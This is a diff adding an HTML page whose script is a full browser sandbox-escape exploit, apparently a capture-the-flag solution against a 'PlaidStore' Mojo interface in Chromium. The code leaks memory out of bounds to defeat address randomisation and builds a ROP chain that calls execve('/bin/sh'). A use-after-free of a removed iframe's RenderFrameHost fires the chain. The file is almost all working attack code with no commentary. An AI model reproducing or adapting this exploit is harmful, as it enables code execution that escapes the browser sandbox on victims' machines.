@@ -1,0 +1,223 @@
+<html>
+
+<pre id='log'></pre>
+<script src="mojojs/mojo/public/js/mojo_bindings.js"></script>
+<script src="mojojs/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
+<script>
+
+function success(msg) {
+    console.log('[+] ' + msg);
+    document.body.innerText += '[+] ' + msg + '\n'; 
+}
+
+function hex(i){
+    return '0x'+i.toString(16);
+}
+
+function success_value(msg, value) {
+    console.log('[+] ' + msg+hex(value));
+    document.body.innerText += '[+] ' + msg + hex(value) + '\n'; 
+}
+
+function debug(){
+    for(let i = 0; i < 0x100000; i++){
+        for(let j = 0; j < 0x100000; j++){
+            var x = x + i + j;
+        }
+    }
+}
+
+function b2i(bytes){
+    var value = 0;
+    for(var i = 0; i < 8; i++){
+        value = value * 0x100 + bytes[7-i];
+    }
+    return value;
+}
+
+async function pwn(){
+
+    var ps_list = [];
+    var try_size = 100;
+    var code_leak = 0;
+    var render_leak;
+    for(let i = 0; i < try_size; i++){
+        var tmp_ps_ptr = new blink.mojom.PlaidStorePtr();
+        Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(tmp_ps_ptr).handle, "context", true);
+        await tmp_ps_ptr.storeData("aaaa", new Uint8Array(0x28).fill(0x30+i))
+        ps_list.push(tmp_ps_ptr);
+    }
+    for(let i = 0; i < try_size; i++){
+        if(code_leak != 0){
+            break;
+        }
+        var tmp_ps_ptr = ps_list[i];
+        let r = (await tmp_ps_ptr.getData("aaaa", 0x100));
+        let leak = r.data;
+        for(let i = 0x28; i < 0x100; i = i + 8){
+            let tmp_leak = b2i(leak.slice(i, i+8));
+            if(hex(tmp_leak & 0xfff) == "0x7a0" ){
+                code_leak = tmp_leak;
+                i += 8;
+                render_leak = b2i(leak.slice(i, i+8));
+                success_value("render_frame_host: ", render_leak);
+                break;
+            }
+        }
+    }
+    if(code_leak == 0){
+        throw 1;
+    }
+    var code_base = code_leak-0x9fb67a0;
+    success_value('code base: ', code_base);
+    var xchg = code_base+0x880dee8; // xchg rsp, rax; clc; pop rbp; ret;
+    success_value("xchg gadget: ", xchg);
+
+    var pop_rdi_ret = code_base+0x4103d24;
+    success_value('pop_rdi_ret: ', pop_rdi_ret);
+
+    var pop_rsi_ret = code_base+0x677fbb6;
+    success_value('pop_rsi_ret: ', pop_rsi_ret);
+
+    var pop_rdx_ret = code_base+0x64d8c1d;
+    success_value('pop_rdx_ret: ', pop_rdx_ret);
+
+    var pop_rax_ret = code_base+0x608df14;
+    success_value('pop_rax_ret: ', pop_rax_ret);
+
+    var syscall = code_base+0x510b419;
+    success_value('syscall: ', syscall);
+
+    function addFrame(){
+        var frame = document.createElement("iframe");
+        frame.srcdoc = `
+// <script src="mojojs/mojo/public/js/mojo_bindings.js"><\/script>
+<script src="mojojs/mojo/public/js/mojo_bindings_lite.js"><\/script>
+// <script src="mojojs/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"><\/script>
+<script src="mojojs/third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"><\/script>
+<script>
+
+function b2i(bytes){
+    var value = 0;
+    for(var i = 0; i < 8; i++){
+        value = value * 0x100 + bytes[7-i];
+    }
+    return value;
+}
+
+function hex(i){
+    return '0x'+i.toString(16);
+}
+
+async function leak(){
+    var ps_list = [];
+    var try_size = 100;
+    var code_leak = 0;
+    var render_leak = 0;
+    var ps_ptr = 0;
+    for(let i = 0; i < try_size; i++){
+        // var tmp_ps_ptr = new blink.mojom.PlaidStorePtr();
+        var tmp_ps_ptr = blink.mojom.PlaidStore.getRemote(true);
+        // Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(tmp_ps_ptr).handle, "context", true);
+        await tmp_ps_ptr.storeData("aaaa", new Uint8Array(0x28).fill(0x31))
+        ps_list.push(tmp_ps_ptr);
+    }
+    for(let i = 0; i < try_size; i++){
+        if(code_leak != 0){
+            break;
+        }
+        var tmp_ps_ptr = ps_list[i];
+        let r = (await tmp_ps_ptr.getData("aaaa", 0x100));
+        let leak = r.data;
+        for(let i = 0x28; i < 0x100; i = i + 8){
+            let tmp_leak = b2i(leak.slice(i, i+8));
+            if(hex(tmp_leak & 0xfff) == "0x7a0" ){
+                code_leak = tmp_leak;
+                // console.log('find!', hex(code_leak));
+                i += 8;
+                render_leak = b2i(leak.slice(i, i+8));
+                ts_ptr = tmp_ps_ptr;
+                break;
+            }
+        }
+    }
+    if(code_leak == 0){
+        throw 1;
+    }
+    var code_base = code_leak-0x9fb67a0;
+    var xchg = code_base+0x880dee8;
+    // console.log('find!', hex(code_base));
+
+    var test_ps_ptr = ps_list[0];
+
+    window.code_base = code_base;
+    window.render_leak = render_leak;
+    window.test_ps_ptr = test_ps_ptr;
+}
+
+
+<\/script>
+`;
+        document.body.appendChild(frame);
+        return frame;
+    }
+
+    var frame = addFrame();
+    var kRenderFrameHost = 0xc28;
+
+    // template rop buffer, have to change vtable
+    var uaf_ab = new ArrayBuffer(kRenderFrameHost);
+    var uaf_ta = new BigUint64Array(uaf_ab);
+    uaf_ta[0] = BigInt(0x31313131313131); // vtable
+
+    uaf_ta[3] = BigInt(pop_rdi_ret);
+    uaf_ta[4] = BigInt(0x31313131313131); // vtable+0x178
+    uaf_ta[5] = BigInt(pop_rsi_ret);
+    uaf_ta[6] = BigInt(0);
+    uaf_ta[7] = BigInt(pop_rdx_ret);
+    uaf_ta[8] = BigInt(0);
+    uaf_ta[9] = BigInt(pop_rax_ret);
+    uaf_ta[10] = BigInt(59);
+    uaf_ta[11] = BigInt(syscall);
+
+    uaf_ta[(0x10+0x160)/8] = BigInt(xchg);
+
+    var uaf_uint8 = new Uint8Array(uaf_ab); // /bin/sh\x00
+    uaf_uint8[0x10+0x160+8+0] = 0x2f;
+    uaf_uint8[0x10+0x160+8+1] = 0x62;
+    uaf_uint8[0x10+0x160+8+2] = 0x69;
+    uaf_uint8[0x10+0x160+8+3] = 0x6e;
+    uaf_uint8[0x10+0x160+8+4] = 0x2f;
+    uaf_uint8[0x10+0x160+8+5] = 0x73;
+    uaf_uint8[0x10+0x160+8+6] = 0x68;
+    uaf_uint8[0x10+0x160+8+7] = 0x00;
+
+    frame.contentWindow.addEventListener("DOMContentLoaded", async () => {
+        await frame.contentWindow.leak();
+        var frame_code_base = frame.contentWindow.code_base;
+        var frame_render = frame.contentWindow.render_leak;
+        var frame_test_ps_ptr = frame.contentWindow.test_ps_ptr;
+
+        if(frame_code_base == 0 || frame_render == 0 || frame_code_base != code_base){
+            throw 2;
+        }
+        success_value("iframe render_frame_host: ", frame_render);
+
+        uaf_ta[0] = BigInt(frame_render)+0x10n;
+        uaf_ta[4] = BigInt(frame_render)+0x10n+0x160n+8n;
+
+        frame.remove();
+
+        for(let i = 0; i < 100; i++){
+            ps_list[i].storeData('666', new Uint8Array(uaf_ab));
+        }
+
+        success("getshell!");
+        frame_test_ps_ptr.getData('1', 1);
+    });
+}
+
+pwn();
+
+</script>
+</html>
